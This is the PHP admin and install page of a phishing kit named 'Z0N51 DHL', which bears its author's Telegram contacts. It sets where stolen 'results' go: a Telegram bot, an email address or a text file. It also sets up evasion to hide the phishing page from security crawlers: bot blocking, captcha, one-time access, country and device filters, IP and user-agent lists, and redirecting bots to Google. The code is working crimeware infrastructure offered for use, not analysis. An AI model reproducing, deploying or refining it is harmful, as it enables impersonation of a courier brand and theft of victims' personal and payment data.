<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/

    session_start();
    session_regenerate_id();
    error_reporting(0);
    $password = "dhhL998";
    $page_title = "Z0N51 DHL";

    if( file_exists("config.db") ) {
        $infos = json_decode(file_get_contents("config.db"),true);
    } else {
        $infos = [];
    }

    $whitelist = json_decode($infos['whitelist'],true);
    if( is_array($whitelist) )
        $whitelist = implode("\n", $whitelist);

    $blacklist = json_decode($infos['blacklist'],true);
    if( is_array($blacklist) )
        $blacklist = implode("\n", $blacklist);

    $useragent = json_decode($infos['useragent'],true);
    if( is_array($useragent) )
        $useragent = implode("\n", $useragent);

    $via_telegram        = ( $infos['via_telegram'] ) ? $infos['via_telegram'] : '';
    $token               = ( $infos['token'] ) ? $infos['token'] : '';
    $chat_id             = ( $infos['chat_id'] ) ? $infos['chat_id'] : '';

    $via_email           = ( $infos['via_email'] ) ? $infos['via_email'] : '';
    $email               = ( $infos['email'] ) ? $infos['email'] : '';

    $via_txt             = ( $infos['via_txt'] ) ? $infos['via_txt'] : '';
    $txtfilename         = ( $infos['txtfilename'] ) ? $infos['txtfilename'] : '';

    $one_time_access     = ( $infos['one_time_access'] ) ? $infos['one_time_access'] : '';

    $hcaptcha             = ( $infos['hcaptcha'] ) ? $infos['hcaptcha'] : '';
    $hcaptcha_secret_key = ( $infos['hcaptcha_secret_key'] ) ? $infos['hcaptcha_secret_key'] : '';
    $hcaptcha_site_key   = ( $infos['hcaptcha_site_key'] ) ? $infos['hcaptcha_site_key'] : '';

    $antibot             = ( $infos['antibot'] ) ? $infos['antibot'] : '';
    $botblockerkey        = ( $infos['botblockerkey'] ) ? $infos['botblockerkey'] : '';

    $device              = ( $infos['device'] ) ? $infos['device'] : '';
    $allowed_countries   = ( $infos['allowed_countries'] ) ? $infos['allowed_countries'] : '';
    $redirect_bots       = ( $infos['redirect_bots'] ) ? $infos['redirect_bots'] : 'https://www.google.com/';

    if( isset($_POST['pass']) ) {
        if( $_POST['pass'] == $password ) {
            $_SESSION['acc3ss'] = true;
            header("Location: install.php");
            exit();
        }
    }

    if( isset($_POST['config']) ) {

        if( !empty($_POST['whitelist']) ) {
            $whitelistArray = explode("\n", $_POST['whitelist']);
        }

        if( !empty($_POST['blacklist']) ) {
            $blacklistArray = explode("\n", $_POST['blacklist']);
        }
        
        if( !empty($_POST['useragent']) ) {
            $useragentArray = explode("\n", $_POST['useragent']);
        }

        $config = [
            'via_telegram'        => $_POST['via_telegram'],
            'token'               => $_POST['token'],
            'chat_id'             => $_POST['chat_id'],
            'via_email'           => $_POST['via_email'],
            'email'               => $_POST['email'],
            'via_txt'             => $_POST['via_txt'],
            'txtfilename'         => $_POST['txtfilename'],
            'one_time_access'     => $_POST['one_time_access'],
            'hcaptcha'            => $_POST['hcaptcha'],
            'hcaptcha_secret_key' => $_POST['hcaptcha_secret_key'],
            'hcaptcha_site_key'   => $_POST['hcaptcha_site_key'],
            'antibot'             => $_POST['antibot'],
            'botblockerkey'        => $_POST['botblockerkey'],
            'device'              => $_POST['device'],
            'allowed_countries'   => $_POST['allowed_countries'],
            'whitelist'           => json_encode($whitelistArray),
            'blacklist'           => json_encode($blacklistArray),
            'useragent'           => json_encode($useragentArray),
            'redirect_bots'       => $_POST['redirect_bots'],
        ];

        $fp = fopen("config.db", "w");
        fputs($fp, json_encode($config));
        fclose($fp);
        header("Location: install.php");
        exit();
    }

?>

<!doctype html>
<html style="display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <title><?php echo $page_title; ?> CONFIGURATION</title>
    </head>

    <body style="display: flex; flex-direction: column; height: 100%;">

        
        <?php if( !isset($_SESSION['acc3ss']) ) : ?>
        <main class="pt-5 pb-5 flex-grow-1 d-flex justify-content-center align-items-center">
            <div class="container">

                <div class="logo text-center mb-5">
                    <img style="max-width: 130px; border-radius: 100%;" src="assets/images/logo.jpg">
                </div>

                <form action="" method="POST">
                    <div style="max-width: 300px; margin: 0 auto;">
                        <div class="form-group mb10 text-center">
                            <input type="password" name="pass" id="pass" class="form-control dinline-block" placeholder="Password">
                        </div>
                        <button type="submit" class="btn w-100 btn-block btn-primary">Enter</button>
                    </div>
                </form>
            </div>
        </main>
        <?php endif; ?>

        <?php if( isset($_SESSION['acc3ss']) ) : ?>
        <main id="main" class="pt-5 pb-5">
            <div class="container">
                <div class="login-area" style="max-width: 500px; margin: 0 auto;">
                    <div class="logo text-center mb-5">
                        <img style="max-width: 130px; border-radius: 100%;" src="assets/images/logo.jpg">
                    </div>

                    <div class="card">
                        <h3 class="card-header pt-3 pb-3 text-center" style="font-weight: 700;"><?php echo $page_title; ?> <span class="badge bg-warning text-dark" style="font-size: 12px; vertical-align: super;">Configuration</span></h3>
                        <div class="card-body">

                            <?php
                                if( isset($_GET['success']) ) {
                                    echo '<div class="alert alert-success" role="alert">Success!</div>';
                                } else if( isset($_GET['error']) ) {
                                    echo '<div class="alert alert-danger" role="alert">Error!</div>';
                                }
                            ?>

                            <form action="" method="POST" autocomplete="off">
                                <input type="hidden" name="config" id="config">

                                <div class="form-group mb-4">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" value="1" id="via_telegram" name="via_telegram" <?php if( $via_telegram == 1 ) { echo "checked"; } ?>>
                                        <label class="form-check-label" for="via_telegram">
                                            Get results via telegram
                                        </label>
                                    </div>
                                </div>

                                <div class="form-group mb-4" data-show="via_telegram">
                                    <label for="token">Bot Token</label>
                                    <input type="text" name="token" id="token" class="form-control form-control-lg" placeholder="1234567890:ZZEk0jJmPOsUcy025JfZeBloPK0PeCjTT9K" value="<?php echo $token; ?>">
                                </div>

                                <div class="form-group mb-4" data-show="via_telegram">
                                    <label for="chat_id">Chat ID</label>
                                    <input type="text" name="chat_id" id="chat_id" class="form-control form-control-lg" placeholder="-123456789 / 2563225599" value="<?php echo $chat_id; ?>">
                                </div>

                                <div class="form-group mb-4">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" value="1" id="via_email" name="via_email" <?php if( $via_email == 1 ) { echo "checked"; } ?>>
                                        <label class="form-check-label" for="via_email">
                                            Get results via email
                                        </label>
                                    </div>
                                </div>

                                <div class="form-group mb-4" data-show="via_email">
                                    <label for="email">Email</label>
                                    <input type="text" name="email" id="email" class="form-control form-control-lg" placeholder="myresult@email.com" value="<?php echo $email; ?>">
                                </div>

                                <div class="form-group mb-4">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" value="1" id="via_txt" name="via_txt" <?php if( $via_txt == 1 ) { echo "checked"; } ?>>
                                        <label class="form-check-label" for="via_txt">
                                            Get results via txt file
                                        </label>
                                    </div>
                                </div>

                                <div class="form-group mb-4" data-show="via_txt">
                                    <label for="txtfilename">TXT file name </label>
                                    <input type="text" name="txtfilename" id="txtfilename" class="form-control form-control-lg" placeholder="TXT file name ex: myresults" value="<?php echo $txtfilename; ?>">
                                </div>

                                <div class="form-group mb-4">
                                    <div class="form-check form-switch">
                                        <input class="form-check-input" type="checkbox" role="switch" id="one_time_access" name="one_time_access" <?php if( $one_time_access == "on" ) { echo "checked"; } ?>>
                                        <label class="form-check-label" for="one_time_access">One time access</label>
                                    </div>
                                </div>

                                <div class="form-group mb-4">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" value="1" id="hcaptcha" name="hcaptcha" <?php if( $hcaptcha == 1 ) { echo "checked"; } ?>>
                                        <label class="form-check-label" for="hcaptcha">
                                            Hcaptcha
                                        </label>
                                    </div>
                                </div>

                                <div class="form-group mb-4" data-show="hcaptcha">
                                    <p class="mb-3">
                                        Put your API hcaptcha and Secreth Captcha<br>
                                        <mark>it's free at hcaptcha.com</mark>
                                    </p>
                                    <label for="hcaptcha_secret_key">hCaptcha Secret Key</label>
                                    <input type="text" name="hcaptcha_secret_key" id="hcaptcha_secret_key" class="form-control form-control-lg" placeholder="Secret Key" value="<?php echo $hcaptcha_secret_key; ?>">
                                </div>

                                <div class="form-group mb-4" data-show="hcaptcha">
                                    <label for="hcaptcha_site_key">hCaptcha Site Key</label>
                                    <input type="text" name="hcaptcha_site_key" id="hcaptcha_site_key" class="form-control form-control-lg" placeholder="Site Key" value="<?php echo $hcaptcha_site_key; ?>">
                                </div>

                                <div class="form-group mb-4">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" value="1" id="antibot" name="antibot" <?php if( $antibot == 1 ) { echo "checked"; } ?>>
                                        <label class="form-check-label" for="antibot">
                                            Antibot
                                        </label>
                                    </div>
                                </div>

                                <div class="form-group mb-4" data-show="antibot">
                                    <p class="mb-3">
                                        Put your <mark>botblocker.pro</mark>APIKEY
                                    </p>
                                    <label for="botblockerkey">botblocker.pro APIKEY</label>
                                    <input type="text" name="botblockerkey" id="botblockerkey" class="form-control form-control-lg" placeholder="APIKEY" value="<?php echo $botblockerkey; ?>">
                                </div>

                                <div class="form-group mb-4">
                                    <label for="allowed_countries">Devices</label>
                                    <select style="font-size: 14px;" name="device" id="device" class="form-control form-control-lg">
                                        <option <?php if( $device == 'all' ) { echo 'selected'; } ?> value="all">Allow all devices</option>
                                        <option <?php if( $device == 'mobile' ) { echo 'selected'; } ?> value="mobile">Allow Mobile Device Only</option>
                                        <option <?php if( $device == 'desktop' ) { echo 'selected'; } ?> value="desktop">Allow Desktop Device Only</option>
                                    </select>
                                </div>

                                <div class="form-group mb-4">
                                    <label for="allowed_countries">Allowed countries</label>
                                    <input type="text" name="allowed_countries" id="allowed_countries" class="form-control form-control-lg" placeholder="Ex: FR,ES,DE" value="<?php echo $allowed_countries; ?>">
                                    <p>
                                        Enter the country codes, separated by a comma <mark>(,)</mark><br>
                                        Leave it <mark>empty</mark> to allow all countries
                                    </p>
                                </div>

                                <div class="form-group mb-4">
                                    <label for="whitelist">Whitelist</label>
                                    <textarea style="font-size: 14px;" name="whitelist" id="whitelist" class="form-control form-control-lg" rows="3"><?php echo $whitelist; ?></textarea>
                                    <p>
                                        Enter the ips, one ip per line.
                                    </p>
                                </div>

                                <div class="form-group mb-4">
                                    <label for="blacklist">Blacklist</label>
                                    <textarea style="font-size: 14px;" name="blacklist" id="blacklist" class="form-control form-control-lg" rows="3"><?php echo $blacklist; ?></textarea>
                                    <p>
                                        Enter the ips, one ip per line.
                                    </p>
                                </div>

                                <div class="form-group mb-4">
                                    <label for="useragent">User Agent Filter</label>
                                    <textarea style="font-size: 14px;" name="useragent" id="useragent" class="form-control form-control-lg" rows="3"><?php echo $useragent; ?></textarea>
                                    <p>
                                        Enter User Agents, one agent per line.
                                    </p>
                                </div>

                                <div class="form-group mb-4">
                                    <label for="redirect_bots">Redirect bots to</label>
                                    <input type="text" name="redirect_bots" id="redirect_bots" class="form-control form-control-lg" placeholder="https://www.google.com" value="<?php echo $redirect_bots; ?>">
                                </div>
                                <button type="submit" class="btn btn-lg btn-primary d-block w-100">SUBMIT</button>
                            </form>

                        </div>
                    </div>
                </div>
            </div>
        </main>
        <?php endif; ?>

        <footer id="footer">
            <div class="container" style="max-width: 700px;">
                <h3 class="mb-4">Z0N51 <i style="color: red;" class="fa-solid fa-heart"></i></h3>
                <div class="row">
                    <div class="col-md-6 mb-lg-0 mb-md-3 mb-sm-3 mb-3">
                        <h4>Channels</h4>
                        <ul>
                            <li><a target="_blank" href="https://t.me/z0n51pages">@z0n51pages</a></li>
                        </ul>
                    </div>
                    <div class="col-md-6">
                        <h4>Contacts</h4>
                        <ul>
                            <li><a target="_blank" href="https://t.me/z0n51official">@z0n51official</a></li>
                            <li><a target="_blank" href="https://t.me/elz0n51">@elz0n51</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="assets/js/main.js"></script>

        <script>

            $('input[type="checkbox"]').each(function(){

                var id = $(this).attr('id');
                if( $(this).is(':checked') ) {
                    $('[data-show="'+ id +'"]').show();
                }

            });
            
            $('input[type="checkbox"]').click(function(){
                var id = $(this).attr('id');
                if( $(this).is(':checked') ) {
                    $('[data-show="'+ id +'"]').show();
                } else {
                    $('[data-show="'+ id +'"]').hide();
                }
            });

        </script>

    </body>

</html>